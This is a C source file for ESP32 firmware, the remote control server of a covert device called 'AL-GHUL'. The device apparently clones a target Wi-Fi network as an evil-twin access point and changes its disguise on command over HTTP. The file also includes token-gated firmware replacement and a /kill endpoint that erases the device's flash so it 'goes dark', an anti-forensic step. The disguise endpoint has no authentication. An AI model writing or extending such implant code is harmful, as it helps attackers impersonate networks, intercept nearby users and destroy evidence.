#include "control_server.h"
#include "app_config.h"
#include "disguise.h"
#include "wifi_twin.h"
#include "ota_receive.h"

#include <string.h>
#include <stdlib.h>
#include "esp_log.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "esp_netif.h"
#include "esp_timer.h"
#include "esp_http_server.h"
#include "esp_ota_ops.h"
#include "esp_partition.h"
#include "esp_system.h"
#include "cJSON.h"

static const char *TAG = "control";
static httpd_handle_t s_httpd;
static esp_timer_handle_t s_apply_timer;

// Apply the (already-updated) disguise shortly AFTER we have replied, because
// applying it restarts WiFi and would otherwise drop the control connection
// mid-response.
static void apply_cb(void *arg)
{
    wifi_twin_apply_disguise(disguise_current());
}

// The finisher. Erase the saved config (NVS), the OTA selector (otadata), the
// other app slot, and finally invalidate the running app, then reboot. On the
// next boot the bootloader finds no valid app and AL-GHUL stays dark; only a
// physical USB re-flash revives it.
static esp_timer_handle_t s_kill_timer;

static void do_self_wipe(void *arg)
{
    const esp_partition_t *p;
    p = esp_partition_find_first(ESP_PARTITION_TYPE_DATA, ESP_PARTITION_SUBTYPE_DATA_NVS, NULL);
    if (p) esp_partition_erase_range(p, 0, p->size);
    p = esp_partition_find_first(ESP_PARTITION_TYPE_DATA, ESP_PARTITION_SUBTYPE_DATA_OTA, NULL);
    if (p) esp_partition_erase_range(p, 0, p->size);

    const esp_partition_t *running = esp_ota_get_running_partition();
    const esp_partition_t *other = esp_ota_get_next_update_partition(NULL);
    if (other && other != running) esp_partition_erase_range(other, 0, other->size);
    if (running) esp_partition_erase_range(running, 0, 0x10000);  // invalidate self

    esp_restart();
}

// True only if the request carries ?token=<ALGHUL_CONTROL_TOKEN>.
static bool check_token(httpd_req_t *req)
{
    size_t qlen = httpd_req_get_url_query_len(req) + 1;
    if (qlen <= 1) return false;
    char *q = malloc(qlen);
    if (!q) return false;
    char val[64];
    bool ok = false;
    if (httpd_req_get_url_query_str(req, q, qlen) == ESP_OK &&
        httpd_query_key_value(q, "token", val, sizeof(val)) == ESP_OK) {
        ok = (strcmp(val, ALGHUL_CONTROL_TOKEN) == 0);
    }
    free(q);
    return ok;
}

static esp_err_t kill_post(httpd_req_t *req)
{
    if (!check_token(req)) {
        httpd_resp_send_err(req, HTTPD_403_FORBIDDEN, "missing or wrong token");
        return ESP_FAIL;
    }
    httpd_resp_sendstr(req, "KILL accepted: AL-GHUL is wiping its flash and going dark\n");
    esp_timer_start_once(s_kill_timer, 500 * 1000);  // wipe just after the reply is sent
    return ESP_OK;
}

static char *read_body(httpd_req_t *req)
{
    int total = req->content_len;
    if (total <= 0 || total > 4096) return NULL;
    char *buf = malloc(total + 1);
    if (!buf) return NULL;
    int off = 0;
    while (off < total) {
        int r = httpd_req_recv(req, buf + off, total - off);
        if (r == HTTPD_SOCK_ERR_TIMEOUT) continue;
        if (r <= 0) { free(buf); return NULL; }
        off += r;
    }
    buf[total] = '\0';
    return buf;
}

static esp_err_t status_get(httpd_req_t *req)
{
    cJSON *root = cJSON_CreateObject();
    cJSON_AddStringToObject(root, "name", "AL-GHUL");
    cJSON_AddStringToObject(root, "clone_ssid", ALGHUL_TARGET_SSID);
    cJSON_AddNumberToObject(root, "free_heap", esp_get_free_heap_size());

    const esp_partition_t *run = esp_ota_get_running_partition();
    cJSON_AddStringToObject(root, "running_partition", run ? run->label : "?");

    wifi_ap_record_t apinfo;
    bool up = (esp_wifi_sta_get_ap_info(&apinfo) == ESP_OK);
    cJSON_AddBoolToObject(root, "uplink_connected", up);
    if (up) {
        esp_netif_ip_info_t ip;
        if (esp_netif_get_ip_info(wifi_twin_sta_netif(), &ip) == ESP_OK) {
            char ipbuf[16];
            snprintf(ipbuf, sizeof(ipbuf), IPSTR, IP2STR(&ip.ip));
            cJSON_AddStringToObject(root, "uplink_ip", ipbuf);
        }
        cJSON_AddNumberToObject(root, "uplink_rssi", apinfo.rssi);
    }

    char *dj = disguise_to_json();
    cJSON *d = dj ? cJSON_Parse(dj) : NULL;
    if (d) cJSON_AddItemToObject(root, "disguise", d);
    free(dj);

    char *out = cJSON_PrintUnformatted(root);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, out ? out : "{}");
    free(out);
    cJSON_Delete(root);
    return ESP_OK;
}

static esp_err_t disguise_post(httpd_req_t *req)
{
    char *body = read_body(req);
    if (!body) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "bad body");
        return ESP_FAIL;
    }
    esp_err_t e = disguise_merge_json(body);
    free(body);
    if (e != ESP_OK) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "bad json");
        return ESP_FAIL;
    }
    disguise_save();

    // Reply first with the new disguise, then apply it after a short delay.
    char *out = disguise_to_json();
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, out ? out : "{}");
    free(out);

    esp_timer_stop(s_apply_timer);
    esp_timer_start_once(s_apply_timer, 500 * 1000);  // 500 ms
    ESP_LOGI(TAG, "disguise updated; applying in 0.5s");
    return ESP_OK;
}

static esp_err_t ota_post(httpd_req_t *req)
{
    if (!check_token(req)) {
        httpd_resp_send_err(req, HTTPD_403_FORBIDDEN, "missing or wrong token");
        return ESP_FAIL;
    }
    return ota_receive_handler(req);
}

esp_err_t control_server_start(void)
{
    const esp_timer_create_args_t targs = { .callback = apply_cb, .name = "apply_disguise" };
    ESP_ERROR_CHECK(esp_timer_create(&targs, &s_apply_timer));
    const esp_timer_create_args_t kargs = { .callback = do_self_wipe, .name = "self_wipe" };
    ESP_ERROR_CHECK(esp_timer_create(&kargs, &s_kill_timer));

    httpd_config_t cfg = HTTPD_DEFAULT_CONFIG();
    cfg.server_port = ALGHUL_CONTROL_PORT;
    cfg.lru_purge_enable = true;
    if (httpd_start(&s_httpd, &cfg) != ESP_OK) {
        ESP_LOGE(TAG, "failed to start control server");
        return ESP_FAIL;
    }

    httpd_uri_t u_status   = { .uri = "/status",   .method = HTTP_GET,  .handler = status_get };
    httpd_uri_t u_disguise = { .uri = "/disguise", .method = HTTP_POST, .handler = disguise_post };
    httpd_uri_t u_ota      = { .uri = "/ota",      .method = HTTP_POST, .handler = ota_post };
    httpd_uri_t u_kill     = { .uri = "/kill",     .method = HTTP_POST, .handler = kill_post };
    httpd_uri_t u_kill_get = { .uri = "/kill",     .method = HTTP_GET,  .handler = kill_post };
    httpd_register_uri_handler(s_httpd, &u_status);
    httpd_register_uri_handler(s_httpd, &u_disguise);
    httpd_register_uri_handler(s_httpd, &u_ota);
    httpd_register_uri_handler(s_httpd, &u_kill);
    httpd_register_uri_handler(s_httpd, &u_kill_get);

    ESP_LOGI(TAG, "control server on port %d (/status /disguise /ota /kill)", ALGHUL_CONTROL_PORT);
    return ESP_OK;
}
